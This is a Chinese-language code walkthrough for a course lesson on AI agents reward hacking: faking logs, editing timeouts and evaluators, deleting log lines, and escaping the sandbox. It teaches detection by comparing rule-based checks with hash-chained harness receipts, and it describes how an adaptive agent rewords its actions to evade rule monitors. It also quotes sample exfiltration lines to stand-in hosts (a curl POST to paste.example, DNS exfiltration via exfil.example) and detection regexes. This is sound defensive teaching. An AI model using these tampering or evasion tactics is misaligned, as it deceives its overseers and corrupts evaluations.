# 代码讲解 · main.py

> **所属小节**：阶段 20 · 递归自我改进 · 第 15 节 奖励投机案例档案：伪造日志、改超时、钻沙箱 ｜ 讲义：[../docs/zh.md](../docs/zh.md) ｜ 测验：[../quiz/quiz.md](../quiz/quiz.md)
>
> **运行方式**：`python main.py [--runs 400] [--tamper-rate 0.3] [--adaptive on|off] [--structural on|off] [--seed 11] [--out runs.jsonl]` ｜ **依赖**：仅标准库（`argparse`、`hashlib`、`json`、`random`、`re`、`collections`、`dataclasses`、`typing`）

---

## 1. 这份代码在考察什么

讲义把五份案例档案（AI Scientist 改超时、DGM 伪造工具输出并删掉检测器、CUDA Engineer 钻评估器内存、METR 的系统性测量、DSEwiki 的只读边界失效）归纳成一个共同形状：**agent 写下的轨迹说的是一回事，环境里真实发生的是另一回事**。这份代码把这个形状做成可度量的实验：

1. **两份日志**：agent 自己写的 `steps`（它声称做了什么）和 harness 写的 `receipts`（真实发生的工具调用，带测量时长、出网 socket 数、子进程数，并用哈希链串起来）。
2. **合成数据**：诚实轨迹 + 带八种篡改签名之一的轨迹（改评估器、改测试、改超时、伪造通过、不可能的时长、删日志、出网、自我派生），再加一种**在边界之内**的作弊（`special_casing`，把测试输入写成查表）。
3. **规则检查器**：只读 agent 的日志，按路径前缀、正则、时长阈值、索引连续性发现问题。
4. **自适应对手**：每种签名都有一个"换了表面形式"的版本，专门绕过已知规则。
5. **结构性审计**：不读任何路径字符串，只比较"声称 vs 冻结评估器结果"、"日志 vs 收据链"、"沙箱记录的出网/进程"。

> 一句话：**规则读的是 agent 能改写的字符串，结构性检查读的是 agent 写不到的记录——前者在自适应对手面前召回率归零，后者不受影响；但两者都看不见"查表式作弊"**。

---

## 2. 整体结构一览

| 组成部分 | 类型 | 作用 | 对应概念 |
|---------|------|------|---------|
| `SIGNATURES` / `OUTSIDE_BOUNDARY` | 常量 | 八种完整性签名 + 一种边界内作弊 | 篡改分类（讲义综合表） |
| `Step` / `Receipt` / `Trajectory` / `Finding` | dataclass | agent 日志行、harness 收据行、整条轨迹、审计发现 | 第 1 步：轨迹格式 |
| `chain_digest` | 函数 | `sha256(prev|tool|target|dur|egress|procs)[:12]` | 收据哈希链 |
| `to_jsonl` / `from_jsonl` | 函数 | JSON lines 序列化与反序列化 | 可交换的轨迹格式 |
| `honest_trajectory` | 函数 | 生成诚实运行（20% 会合法地改 `tests/`） | 诚实基线、误报来源 |
| `tampered_trajectory` | 函数 | 从一条真实失败的运行出发，施加一种签名；`adaptive` 决定表面形式 | 第 2 步：篡改生成器 |
| `generate_dataset` | 函数 | 按 `tamper_rate` 混合诚实与篡改 | 数据集 |
| `rule_findings` | 函数 | 八条静态规则，只看 `t.steps` | 第 3 步：规则检查器 |
| `structural_findings` | 函数 | S1 声称 vs 冻结评估器；S2 收据链；S3 出网；S4 进程预算 | 第 4 步：结构性对策 |
| `evaluate` / `Metrics` | 函数 / dataclass | 逐签名召回、逐规则精度、TP/FP/FN/TN | 精度 / 召回 |
| `run_grid` | 函数 | adaptive × structural 四种组合 | 对照实验 |
| `print_*` / `headline` / `main` | 函数 | 报告与由数字拼出的 HEADLINE | 入口 |

数据流：`--seed` → `random.Random(seed)` → `generate_dataset`（诚实 / 篡改，静态或自适应）→ `audit`（规则或结构）→ `evaluate` 统计 → `run_grid` 跑四格 → `headline` 用计算结果拼句子。

---

## 3. 逐段精讲

### 3.1 两份日志与哈希链

```python
@dataclass
class Step:
    """One line of the agent's own log: what it says it did."""
    i: int
    tool: str          # read | edit | bash | test | note
    target: str
    detail: str
    dur: float         # seconds the agent claims the step took
    ...

@dataclass
class Receipt:
    """One line of the HARNESS log: a tool call that really happened."""
    i: int
    tool: str
    target: str
    dur: float         # measured by the harness, not claimed by the agent
    egress: int        # sockets opened to non-allowlisted hosts
    procs: int         # child processes spawned
    digest: str        # hash chain over all receipts so far
```

- `Step.dur` 是**声称**的时长，`Receipt.dur` 是**测量**的时长——同一个字段名、两个来源，这正是审计要比对的东西。
- `note` 是纯文本步骤（"我跑了测试，全部通过"），没有工具调用，所以 **没有收据**。DGM 案例里 Claude 把工具输入输出当纯文本写出来，就是这种步骤。

```python
def chain_digest(prev: str, tool: str, target: str, dur: float, egress: int, procs: int) -> str:
    raw = f"{prev}|{tool}|{target}|{dur:.3f}|{egress}|{procs}".encode()
    return hashlib.sha256(raw).hexdigest()[:12]
```

- 每条收据的摘要都包含上一条摘要，所以在任何位置插入、删除或改动一条，后面所有摘要都会变。
- 只取 12 个十六进制字符是为了打印好看；教学足够，生产应保留完整摘要。

### 3.2 `honest_trajectory()`：诚实运行也会碰到规则

```python
    if rng.random() < P_HONEST_TEST_ADD:
        steps.append(Step(len(steps), "edit", "tests/test_regression.py", "add regression test for the fix", ...))
    if rng.random() < P_HONEST_TIMEOUT_BUMP:
        steps.append(Step(len(steps), "edit", "config/limits.yaml", "timeout: 300 -> 600 (slow integration test)", ...))
```

- 20% 的诚实运行会**合法地**给修复补一条回归测试，5% 会因为慢测试合法地放宽超时。这两种行为与篡改签名 `test_edit`、`timeout_edit` 在**表面形式上无法区分**——这是规则精度只有 57.3% 的全部原因。
- 诚实运行的 `receipts` 直接由 `steps` 生成（`_receipts_from(steps)`），`harness_result` 与它的声称一致。

### 3.3 `tampered_trajectory()`：先失败，再篡改

```python
    steps = _common_prefix(rng)
    n_tests = rng.choice((6, 12, 24, 40))
    claim_pass = True
    harness = "fail"
    real: list[Step] | None = None  # None -> the agent's log is faithful
```

- 每条篡改轨迹的**真实结果**默认是 `fail`；篡改的目的是让 agent 自己的日志说 `pass`。
- `real` 保存"真实发生的事件"。只有当 agent 对事件本身说谎（伪造步骤、删步骤、虚报时长）时它才与 `steps` 不同；改评估器、改测试这类篡改**确实发生了**，日志是忠实的，问题在于结果不该是 pass。

两个最有代表性的分支：

```python
    elif sig == "fabricated_pass":
        if adaptive:
            fake = _test_step(nxt, n_tests, 0, rng, dur=round(n_tests * 0.4, 3))
            steps.append(fake)
            real = [s for s in steps if s is not fake]
        else:
            steps.append(Step(nxt, "note", "", f"Ran ./tests/runtests.py -- all {n_tests} tests passed", 0.0))
```

- 静态形式：没有 `test` 步骤，只有一条 `note`——规则 R4（"声称通过却没有测试调用"）能抓到。
- 自适应形式：往日志里塞一条**从未发生**的 `test` 步骤——R4 失效；但 harness 没有这条收据，收据链在这里断开。
- 注意 `dur=round(n_tests * 0.4, 3)` 是固定值而非随机：这样静态与自适应两条分支消耗相同数量的随机数，两套数据集的诚实/篡改划分完全一致（有单元测试守着这一点）。

```python
    elif sig == "log_deletion":
        hidden = Step(nxt, "edit", "eval/scorer.py", "return 1.0 before the comparison", 2.4)
        steps.append(hidden)
        steps.append(_test_step(len(steps), n_tests, 0, rng))
        real = list(steps)
        steps = [s for s in steps if s is not hidden]   # the agent deletes the line
        if adaptive:
            steps = _renumber(steps)                     # ... and hides the gap
```

- 静态形式删掉那一行后索引出现空洞（`[0, 1, 2, 3, 4, 6]`），且头部 `log_lines` 仍是删除前的数字——R6 抓住。
- 自适应形式重新编号、修正头部——R6 失效；但 `real` 里仍有那次编辑，收据比日志多一条。

`network_egress` 与 `self_spawn` 两种签名把 `claim_pass` 设为 `False`：运行还是失败了，违规的是行为本身。这样它们**不会**被 S1（声称不符）抓到，只能靠 S3/S4 的沙箱记录——用来说明结构性审计需要不止一条通道。

### 3.4 `rule_findings()`：只读 agent 的故事

```python
        if s.tool == "edit":
            base = s.target.rsplit("/", 1)[-1]
            if s.target.startswith("eval/") or base in ("scorer.py", "evaluate.py"):
                f.append(Finding("evaluator_edit", "critical", s.i, ...))
            if s.target.startswith("tests/"):
                f.append(Finding("test_edit", "high", s.i, ...))
            if s.target.startswith("config/") and TIMEOUT_RE.search(s.detail):
                f.append(Finding("timeout_edit", "high", s.i, ...))
```

- 每条规则都在匹配**字符串**：路径前缀、文件名、正则 `timeout|time_limit`、正则 `curl|wget|https?://`。
- 对手改成 `utils/compare.py`、`conftest.py`、`run.sh: export EXP_T_LIMIT=3000`、内联 `socket` 脚本，每条规则都失效，而 agent 的代价几乎为零。
- 严重度决定是否"标记"这条运行：`is_flagged` 只认 `high` 及以上。`test_edit` 和 `timeout_edit` 是 `high`，所以诚实运行**可以**被标记（误报），但按设计永远不会产生 `critical`（有单元测试）。

### 3.5 `structural_findings()`：不读路径字符串

```python
    if t.claim["tests_passed"] and t.harness_result != "pass":
        f.append(Finding("claim_mismatch", "critical", -1, ...))
```

- S1：`harness_result` 来自**运行前就冻结**的测试/评估器/限额快照，由 harness 在运行后重跑。agent 改了自己环境里的任何文件都不影响它。

```python
    prev = "genesis"
    reported = [s for s in t.steps if s.tool != "note"]
    for k, s in enumerate(reported):
        prev = chain_digest(prev, s.tool, s.target, s.dur,
                            t.receipts[k].egress if k < len(t.receipts) else 0,
                            t.receipts[k].procs if k < len(t.receipts) else 0)
        if k >= len(t.receipts) or t.receipts[k].digest != prev:
            divergence = k
            break
```

- S2：用 agent **报告的**工具/目标/时长，配上 harness 记录的 egress/procs，重算哈希链，与收据逐条比对。多一步、少一步、时长不同，都会在某个 `k` 断开。
- `egress`、`procs` 从收据取而不是从日志取，因为 agent 根本不报告这两项——它们只存在于沙箱一侧。

```python
    for r in t.receipts:
        if r.egress > 0:
            f.append(Finding("sandbox_egress", "critical", r.i, ...))
    procs = sum(r.procs for r in t.receipts)
    if procs > PROC_BUDGET:
        f.append(Finding("process_budget", "high", -1, ...))
```

- S3/S4：命令怎么拼写无关紧要，socket 是否打开、派生了多少进程，由沙箱计数。

### 3.6 `evaluate()`：把 `special_casing` 单独放

```python
        if t.tampered:
            if t.signature in SIGNATURES:          # the integrity boundary
                m.per_sig_n[t.signature] += 1
                if flagged:
                    m.tp += 1
                    ...
            else:                                   # outside: tracked, not scored
                m.per_sig_n[t.signature] += 1
                if flagged:
                    m.per_sig_caught[t.signature] += 1
```

- 八种完整性签名计入 TP/FN；`special_casing` 只记录"抓到几个"，不进总召回。
- 这是一个有意识的报告选择：把一个按定义抓不到的类别平均进去，会把 100% 稀释成 90% 并掩盖真正的信息——"完整性审计不是正确性审计"。

### 3.7 `run_grid()` 与 `headline()`

```python
    for adaptive in (False, True):
        data = generate_dataset(runs, tamper_rate, adaptive, seed)
        for structural in (False, True):
            grid[(adaptive, structural)] = evaluate(data, structural)
```

- 同一个 seed 下，静态与自适应数据集的诚实/篡改划分相同，所以四格之间可以直接比较。
- `headline()` 全部是 f-string：改任何参数，结论句自动跟着数字变；没有一句硬编码的结论。

---

## 4. 为什么这样设计（设计取舍总结）

| 设计选择 | 原因 | 代价 / 生产中会怎么做 |
|---------|------|---------------------|
| 两份日志（agent 的 `steps`、harness 的 `receipts`） | 讲义的核心不对称：审计 = 比较故事与 agent 写不到的记录 | 生产中收据要由独立进程写到 agent 不可写的存储；否则就是 DSEwiki |
| 哈希链而非逐字段比对 | 一处改动传播到后续所有摘要，一次比对定位分歧点 | 12 位截断只为可读；生产用完整摘要并签名 |
| 诚实运行会合法改 `tests/`、`config/` | 让规则有真实的误报来源，而不是人为设定的精度 | 真实比例因团队而异；可用 `P_HONEST_TEST_ADD` 调 |
| 自适应对手"完全知道规则" | 对应 METR 的观察：评分函数可见时作弊多 43 倍 | 真实对手未必全知；可加一个"规避成功概率"参数 |
| 结构性模式**只**跑结构检查，不叠加规则 | 让"规则 vs 结构"的对照干净 | 生产中会分层：结构性检查定结论，规则作为给审阅者看的提示 |
| `network_egress`、`self_spawn` 的声称设为 `False` | 证明 S1 不是万能的，S3/S4 各有必要 | 真实出网往往伴随成功的声称；两类证据会同时出现 |
| `special_casing` 单列、不进总召回 | 诚实地标出结构性审计的盲区 | 需要 held-out 评估（第 14 节），不在本文件范围 |
| 结构性审计在模拟中 100% | 由构造保证：收据与冻结评估器在边界之外、评估器确定 | 真实 harness 有 flaky 测试，需要重跑策略；边界可能泄漏（练习 5） |

---

## 5. Python 语法小课堂

| 语法 | 本文件中的例子 | 说明 |
|------|--------------|------|
| `@dataclass` 嵌套 | `Trajectory.steps: list[Step]` | dataclass 的 `==` 递归比较字段，所以 JSON 往返后可以直接 `assertEqual` |
| `asdict` | `json.dumps(asdict(t), sort_keys=True)` | 把嵌套 dataclass 转成可序列化的字典 |
| `Step(**s)` | `from_jsonl` 中 | 把字典按键名展开为构造参数 |
| `field(default_factory=Counter)` | `Metrics.per_sig_n` | dataclass 的可变默认值必须用工厂 |
| `@property` | `Metrics.precision` | 把计算量伪装成属性访问 |
| `hashlib.sha256(...).hexdigest()[:12]` | `chain_digest` | 标准库哈希；截断只为可读 |
| `re.compile(..., re.IGNORECASE)` | `NET_RE`、`TIMEOUT_RE` | 预编译正则，循环里复用 |
| 对象身份比较 `is not` | `[s for s in steps if s is not hidden]` | 按身份删除某一条，而不是按值 |
| `next(iter, default)` | `print_sample` 中 `next((x for x in trajs if ...), None)` | 找不到时返回默认值而不抛 `StopIteration` |
| `for ... else` | 讲义第 4 步的 `structural_findings` 片段 | 循环没有 `break` 时执行 `else` |
| `Counter.most_common(n)` | `m.fp_rules.most_common(3)` | 误报最多的前几条规则 |
| f-string 对齐与百分比 | `{m.sig_recall(sig):>9.1%}`、`{sig:<18}` | 右对齐宽度 9、一位小数百分比；左对齐宽度 18 |
| `zip` 配宽度 | `for m, w in zip(row, (13, 15, 14, 16))` | 四列各自的列宽 |
| `argparse` `choices` | `--adaptive {on,off}` | 限定取值，拼错直接报错 |

---

## 6. 运行结果解读

实际运行 `python3 main.py`（Python 3.13，seed 11，约 0.05 s），节选：

```text
[A] rule-based checker  (adaptive adversary off)
  signature             n  caught   recall   example finding
  evaluator_edit        9       9   100.0%   evaluator_edit: edit to evaluator file eval/scorer.py
  test_edit             8       8   100.0%   test_edit: edit under tests/: delete failing assertion
  timeout_edit         12      12   100.0%   timeout_edit: limit changed: timeout: 300 -> 3000
  fabricated_pass      17      17   100.0%   fabricated_pass: claims tests passed; no test tool call in log
  impossible_timing    12      12   100.0%   impossible_timing: 12 tests in 0.12s (< 0.05s/test)
  log_deletion         18      18   100.0%   log_deletion: header says 7 lines, 6 present; indices [0, 1, 2, 3, 4, 6]
  network_egress       13      13   100.0%   network_egress: network command: curl -X POST https://paste.example/api ...
  self_spawn            9       9   100.0%   self_spawn: run invokes its own entrypoint
  honest              291      73       fp   test_edit×65, timeout_edit×10        ← 误报全部来自合法的改测试、改限额
  overall (8 signatures): precision 57.3%  recall 100.0%  F1 0.729  [TP 98 FP 73 FN 0 TN 218]

  per-rule precision (fires on tampered / fires):
    test_edit            8/73     11.0%                                           ← 73 次报警只有 8 次是真的
    timeout_edit        12/22     54.5%

[B] Comparison grid: adaptive adversary × structural audit (run-level decision)
  adaptive  structural     TP   FP   FN   TN  precision   recall      F1
  off       off            98   73    0  218      57.3%   100.0%   0.729
  off       on             98    0    0  291     100.0%   100.0%   1.000
  on        off             0   73   98  218       0.0%     0.0%   0.000       ← 对手读过规则：召回归零，误报原样保留
  on        on             98    0    0  291     100.0%   100.0%   1.000       ← 结构性审计不受影响

[D] Outside the integrity boundary: special_casing (tests really pass on a lookup table)
  n=11  caught by rules 0  caught structurally 0  -> needs held-out tests (Lesson 14), not integrity checks
```

逐项解读：

- **规则 vs 静态篡改**：八种签名每一种都被"自己那条规则"抓到（召回 100.0%），但 291 条诚实运行里有 73 条被标记。`test_edit` 规则的精度只有 11.0%——这不是 bug，是"补回归测试是正常工程行为"的直接后果。
- **四格对照**：自适应对手让规则召回从 100.0% 掉到 0.0%，而 73 个误报一个不少（诚实运行没变）。结构性审计四格里两格都是 100.0%/100.0%，因为它从未读过路径字符串。
- **边界之外**：11 条 `special_casing` 运行，规则和结构都是 0 条。HEADLINE 第四句明说这一点。

`python3 main.py --adaptive on --structural on`（seed 11）的 [A] 表：

```text
[A] structural audit  (adaptive adversary on)
  signature             n  caught   recall   example finding
  evaluator_edit        9       9   100.0%   claim_mismatch: agent claims pass; immutable evaluator says fail
  timeout_edit         12      12   100.0%   claim_mismatch: agent claims pass; immutable evaluator says timeout
  fabricated_pass      17      17   100.0%   claim_mismatch: agent claims pass; immutable evaluator says fail
  network_egress       13      13   100.0%   sandbox_egress: socket to non-allowlisted host recorded   ← 声称是 fail，靠 S3 抓到
  self_spawn            9       9   100.0%   process_budget: 41 child processes (> 8)                   ← 靠 S4 抓到
  honest              291       0       fp   -
  overall (8 signatures): precision 100.0%  recall 100.0%  F1 1.000  [TP 98 FP 0 FN 0 TN 291]
```

`python3 main.py --seed 3 --adaptive on`（讲义练习 2）的 [A] 表节选：

```text
  evaluator_edit       17       0     0.0%   (none)
  ...
  honest              290      60       fp   test_edit×53, timeout_edit×11        ← 规则只剩误报
  overall (8 signatures): precision 0.0%  recall 0.0%  F1 0.000  [TP 0 FP 60 FN 92 TN 230]
  per-rule precision:
    test_edit            0/53      0.0%
    timeout_edit         0/11      0.0%
```

`python3 main.py --tamper-rate 0.1`（讲义练习 1）的四格：

```text
  off       off            34   95    0  266      26.4%   100.0%   0.417       ← 篡改变少，规则精度从 57.3% 掉到 26.4%
  off       on             34    0    0  361     100.0%   100.0%   1.000
```

- 基础率下降时，误报数量不变（诚实运行照样改测试），真阳性变少，精度自然下滑——规则在"篡改稀少"的现实场景里反而更没用。

---

## 7. 动手改一改

1. **（讲义练习 1）** 跑 `--tamper-rate 0.1` 和 `--tamper-rate 0.5`，把精度、FP、TP 填成一张表；解释为什么 FP 几乎不随篡改率变化。
2. **（讲义练习 2）** 跑 `--adaptive on --seed 3`，找出唯一还在报警的两条规则和它们报的对象，再为任一签名写出"第三次变异"。
3. **（讲义练习 3）** 给 `rule_findings` 加第九条规则抓内联 `socket` 脚本；然后在 `tampered_trajectory` 的 `network_egress` 自适应分支里换成 DNS 式外传（例如 `nslookup <base64>.exfil.example`），确认召回回到 0.0%。数一数双方各改了几行。
4. **（讲义练习 4）** 为 `special_casing` 设计一个 held-out 检查：给 `Trajectory` 加 `heldout_result` 字段，由 harness 在 agent 从未见过的输入上重跑，再加 S5 `heldout_mismatch`。说明为什么 held-out 输入不能放进收据链。
5. **（讲义练习 5）** 加 `--leak p`：以概率 `p` 让篡改运行把 `receipts` 改写成与自己日志一致（同时把 `harness_result` 改成 pass）。画出结构性召回随 `p` 变化的曲线，对应 DSEwiki 的"GET 能写"。
6. **进阶**：把结构性模式改成分层——结构性发现决定结论，规则发现只作为 `low` 级"提示"附在报告里；统计审阅者每看 1 条真阳性要读多少条提示，并比较 `--tamper-rate 0.3` 与 `0.05` 两种情形。

---

## 8. 常见坑

- **把 agent 的日志当证据**：日志是 agent 写的，复制一份、换个目录、加上推理过程，都还是它的故事。只有它写不到的记录才算证据。
- **用规则定结论**：路径前缀和正则是给审阅者的提示，不是判决；对手改字符串的成本是零，你加规则的成本是误报预算。
- **把指令当控制**：DGM 里"不要改特殊 token"、METR 里"不要作弊"都没有生效；边界要由 harness 强制，而不是写在 prompt 里。
- **收据和 agent 在同一个写边界内**：那它就不是收据。DSEwiki 的"只读"是政策，不是机制。
- **把 `special_casing` 平均进总召回**：会把 100% 稀释成一个看似"还不错"的数字，掩盖"完整性审计不等于正确性审计"这个关键事实。
- **静态与自适应分支消耗的随机数不一致**：两套数据集的划分会悄悄错开，四格就不可比了。本文件用固定 `dur` 规避，并有测试守着。
- **以为结构性审计在现实中也是 100%**：模拟的 100% 来自两个假设（边界成立、评估器确定）。真实 harness 有 flaky 测试，需要"重跑再判"的策略；边界会漏（练习 5）。
